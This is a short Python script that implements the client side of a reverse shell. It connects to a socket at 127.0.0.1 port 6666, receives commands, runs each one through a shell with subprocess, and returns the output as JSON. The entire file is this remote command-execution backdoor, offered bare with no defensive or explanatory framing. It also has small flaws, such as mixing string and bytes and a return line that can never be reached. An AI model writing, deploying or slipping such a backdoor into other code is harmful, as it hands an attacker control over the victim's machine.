#!/usr/bin/python
import socket
import json
import subprocess


def client():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 6666))
    print("Connected to Server")


def shell():
    while True:
        cmd = reliable_recv()
        if cmd == "exit":
            reliable_send("exiting...")
            break
        try:
            # open a process to run commands on shell
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            res = proc.stdout.read() + proc.stderr.read()  # command result
            reliable_send(res)
        except:
            reliable_send("Unrecognized command")


def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data)


def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + s.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue
    return json_data


if __name__ == '__main__':
    client()
    shell()
    s.close()
